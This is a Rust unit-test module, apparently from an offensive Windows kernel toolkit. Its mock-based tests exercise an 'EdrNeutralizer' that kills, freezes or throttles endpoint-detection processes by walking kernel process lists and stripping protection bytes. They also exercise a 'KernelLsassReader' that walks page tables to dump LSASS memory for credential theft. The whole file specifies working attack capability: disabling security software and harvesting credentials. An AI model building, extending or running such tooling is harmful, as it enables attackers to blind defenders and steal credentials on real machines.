        let krw = MockKrw::new();
        let offsets = test_offsets();
        // head/e1/e2 at 0x1000/0x5000/0x6000 — non-canonical, user space.
        setup_process_list(&krw, &offsets);
        krw.kwrite(0x5000 + offsets.protection, &[0x61]).unwrap();
        let kit = EdrNeutralizer {
            ps_active_process_head_kva: 0x1000,
            offsets,
        };
        assert!(matches!(
            kit.kill_with(&krw, 100, |_| Ok(())),
            Err(KitError::UnsupportedPosture(_))
        ));
        let mut b = [0u8; 1];
        krw.kread(0x5000 + offsets.protection, &mut b).unwrap();
        assert_eq!(
            b[0], 0x61,
            "refused strip must not write to the bogus address"
        );
    }

    #[test]
    fn edr_neutralize_trait_kill_kva_delegates_to_kill() {
        // kill_kva must reach the real resolve walk (NotFound for an unknown
        // PID), not the trait default's "no kernel-r/w Kill tier" stub.
        let krw = MockKrw::new();
        let offsets = test_offsets();
        setup_process_list(&krw, &offsets);
        let kit = EdrNeutralizer {
            ps_active_process_head_kva: 0x1000,
            offsets,
        };
        assert!(matches!(
            EdrNeutralizeKit::kill_kva(&kit, &krw, 999),
            Err(KitError::NotFound)
        ));
    }

    #[test]
    fn edr_neutralize_trait_kill_redirects_to_kill_method() {
        let offsets = test_offsets();
        let kit = EdrNeutralizer {
            ps_active_process_head_kva: 0x1000,
            offsets,
        };
        // The trait method returns an error directing to kill().
        assert!(matches!(
            kit.neutralize(100, NeutralizeMethod::Kill),
            Err(KitError::UnsupportedPosture(_))
        ));
    }

    #[test]
    #[cfg(not(target_os = "windows"))] // verifies non-Windows gate; on Windows it executes
    fn edr_neutralize_trait_freeze_returns_windows_only() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        let kit = EdrNeutralizer {
            ps_active_process_head_kva: 0x1000,
            offsets,
        };
        setup_process_list(&krw, &offsets);
        // On non-Windows, Freeze returns UnsupportedPosture (Windows-only).
        // On Windows, it would try to freeze the target.
        let result = kit.neutralize(100, NeutralizeMethod::Freeze);
        assert!(result.is_err());
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn edr_neutralize_trait_choke_returns_windows_only() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        let kit = EdrNeutralizer {
            ps_active_process_head_kva: 0x1000,
            offsets,
        };
        setup_process_list(&krw, &offsets);
        // On non-Windows, Choke returns UnsupportedPosture (Windows-only).
        let result = kit.neutralize(100, NeutralizeMethod::Choke);
        assert!(result.is_err());
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn freeze_edr_coma_is_windows_only() {
        // freeze_edr_coma is a free function; on non-Windows it returns
        // UnsupportedPosture. This test verifies the platform gate.
        let result = freeze_edr_coma(1234);
        assert!(matches!(result, Err(KitError::UnsupportedPosture(_))));
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn choke_edr_qos_is_windows_only() {
        // choke_edr_qos is a free function; on non-Windows it returns
        // UnsupportedPosture. This test verifies the platform gate.
        let result = choke_edr_qos(1234);
        assert!(matches!(result, Err(KitError::UnsupportedPosture(_))));
    }

    // ---- kernelsdk-2-1: KernelRw address-space contract ----

    #[test]
    fn address_space_marker_distinguishes_spaces() {
        assert_ne!(
            KernelRwAddressSpace::Virtual,
            KernelRwAddressSpace::Physical
        );
        assert_eq!(KernelRwAddressSpace::Virtual, KernelRwAddressSpace::Virtual);
    }

    #[test]
    fn phys_address_validation_rejects_virtual_addresses() {
        // Physical range: below 2^47.
        assert!(is_plausible_phys_address(0));
        assert!(is_plausible_phys_address(0x10000));
        assert!(is_plausible_phys_address(0x7FFF_FFFF_FFFF)); // 2^47 - 1, max plausible
                                                              // Virtual addresses (kernel + user) set bit 47 → rejected.
        assert!(!is_plausible_phys_address(1 << 47));
        assert!(!is_plausible_phys_address(0x0000_8000_0000_0000)); // first user VA
        assert!(!is_plausible_phys_address(0xFFFF_8000_0000_0000)); // first kernel VA
        assert!(!is_plausible_phys_address(0xFFFF_F800_0000_0000)); // ntoskrnl KVA
    }

    #[test]
    fn kernel_va_validation_rejects_phys_and_user_addresses() {
        assert!(is_plausible_kernel_va(0xFFFF_8000_0000_0000));
        assert!(is_plausible_kernel_va(0xFFFF_F800_0000_0000));
        assert!(is_plausible_kernel_va(u64::MAX));
        assert!(!is_plausible_kernel_va(0x10000)); // physical address
        assert!(!is_plausible_kernel_va(0x7FF6_0000_0000)); // user VA
        assert!(!is_plausible_kernel_va(0x0000_7FFF_FFFF_FFFF)); // max user VA
    }

    /// Lay a 4-level page table in the mock mapping VA 0x1_0000_0000 → phys
    /// 0x14000 (PML4 at 0x10000, PDPT at 0x11000, PD at 0x12000, PT at 0x13000).
    fn setup_mock_page_tables(krw: &MockKrw) {
        krw.set_u64(0x10000, 0x11000 | 0x3); // PML4[0] → PDPT
        krw.set_u64(0x11000 + 4 * 8, 0x12000 | 0x3); // PDPT[4] → PD
        krw.set_u64(0x12000, 0x13000 | 0x3); // PD[0] → PT
        krw.set_u64(0x13000, 0x14000 | 0x3); // PT[0] → data page
        krw.set_u64(0x14000, 0xDEAD_BEEF_CAFE_BABE);
    }

    #[test]
    fn read_process_mem_reads_translated_page() {
        let krw = MockKrw::new();
        setup_mock_page_tables(&krw);
        // EPROCESS at 0x5000 with a plausible DTB (PML4 base 0x10000).
        krw.set_u64(0x5000 + DIRECTORY_TABLE_BASE, 0x10000);
        let bytes = KernelLsassReader::read_process_mem(&krw, 0x5000, 0x1_0000_0000, 8).unwrap();
        let mut b = [0u8; 8];
        b.copy_from_slice(&bytes[..8]);
        assert_eq!(u64::from_le_bytes(b), 0xDEAD_BEEF_CAFE_BABE);
    }

    #[test]
    fn read_process_mem_strict_aborts_on_unmapped_page() {
        let krw = MockKrw::new();
        setup_mock_page_tables(&krw);
        krw.set_u64(0x5000 + DIRECTORY_TABLE_BASE, 0x10000);
        // 0x1_0000_1000 is unmapped (PT[1] absent) → the strict read must
        // error on the second page rather than silently returning zeros.
        let res = KernelLsassReader::read_process_mem(&krw, 0x5000, 0x1_0000_0000, 0x3000);
        assert!(res.is_err());
    }

    #[test]
    fn read_process_mem_skip_unmapped_zero_fills_missing_pages() {
        let krw = MockKrw::new();
        setup_mock_page_tables(&krw);
        krw.set_u64(0x5000 + DIRECTORY_TABLE_BASE, 0x10000);
        // Page 1 mapped, pages 2-3 unmapped → the skip variant returns the
        // mapped bytes followed by zero-filled gaps instead of aborting the
        // whole dump on the first unmapped page (kernelsdk-2-2).
        let bytes =
            KernelLsassReader::read_process_mem_skip_unmapped(&krw, 0x5000, 0x1_0000_0000, 0x3000)
                .unwrap();
        assert_eq!(bytes.len(), 0x3000);
        let mut b = [0u8; 8];
        b.copy_from_slice(&bytes[..8]);
        assert_eq!(u64::from_le_bytes(b), 0xDEAD_BEEF_CAFE_BABE);
        assert!(bytes[0x1000..].iter().all(|&b| b == 0));
    }

    #[test]
    fn read_process_mem_rejects_virtual_looking_dtb() {
        let krw = MockKrw::new();
        // DTB = a kernel VA — the EPROCESS read went through a
        // physical-addressing impl, or the EPROCESS KVA was mis-translated.
        krw.set_u64(0x5000 + DIRECTORY_TABLE_BASE, 0xFFFF_F800_0000_0000);
        let res = KernelLsassReader::read_process_mem(&krw, 0x5000, 0x1_0000_0000, 8);
        assert!(matches!(res, Err(KitError::UnsupportedPosture(_))));
    }

    #[test]
    fn read_process_mem_empty_len_is_ok() {
        let krw = MockKrw::new();
        krw.set_u64(0x5000 + DIRECTORY_TABLE_BASE, 0x10000);
        assert_eq!(
            KernelLsassReader::read_process_mem(&krw, 0x5000, 0x1_0000_0000, 0)
                .unwrap()
                .len(),
            0
        );
    }

    // ---- kernelsdk-2-3: Choke false-success removed ----

    #[test]
    fn choke_rejects_pid_zero_and_validates_nonzero() {
        assert!(matches!(validate_choke_pid(0), Err(KitError::Other(_))));
        assert!(validate_choke_pid(1).is_ok());
        assert!(validate_choke_pid(1234).is_ok());
        // The public entry point validates the pid before anything else
        // (on every platform).
        assert!(choke_edr_qos(0).is_err());
    }

    #[test]
    fn cred_kit_dump_lsass_needs_ps_active_process_head() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        let reader = KernelLsassReader {
            ps_active_process_head_kva: 0,
            offsets,
        };
        assert!(matches!(
            reader.dump_lsass(&krw, 4),
            Err(KitError::UnsupportedPosture(_))
        ));
    }

    #[test]
    fn cred_kit_dump_lsass_finds_lsass_and_reads() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        setup_process_list(&krw, &offsets);
        let reader = KernelLsassReader {
            ps_active_process_head_kva: 0x1000,
            offsets,
        };
        // PID 4 (System) → EPROCESS at 0x5000, DTB at +0x028 = 0x10000.
        // User-mode base is 0x1_0000_0000, which won't be in the mock →
        // read_process_mem will try to translate via pagewalk and fail.
        // That's fine — we're testing the EPROCESS resolution path, not the
        // page walker (which is tested in pagewalk's own tests).
        // So set up PID 4 at e2 (where PID 200 was) by replacing:
        krw.set_u64(0x6000 + offsets.unique_process_id, 4);
        // Populate a non-zero PEB pointer so lsass_image_base proceeds past
        // the PEB check to the read_process_mem page walk — which then fails
        // (no mock page tables). This is the path the test intends to cover.
        krw.set_u64(0x6000 + offsets.peb, 0x1_0000_0000);
        let result = reader.dump_lsass(&krw, 4);
        // With the new PEB-walked ImageBaseAddress read, the page walk fails
        // (no mock page tables) → lsass_image_base returns None → dump_lsass
        // returns UnsupportedPosture. The key thing under test: EPROCESS
        // resolution itself succeeded (PidActiveProcessHead walk found PID 4);
        // the failure is purely downstream, in the user-VA page walk.
        assert!(result.is_err());
        let err_str = alloc::format!("{:?}", result.unwrap_err());
        assert!(
            err_str.contains("ImageBaseAddress")
                || err_str.contains("page walk")
                || err_str.contains("translate"),
            "unexpected error: {err_str}",
        );
    }
}
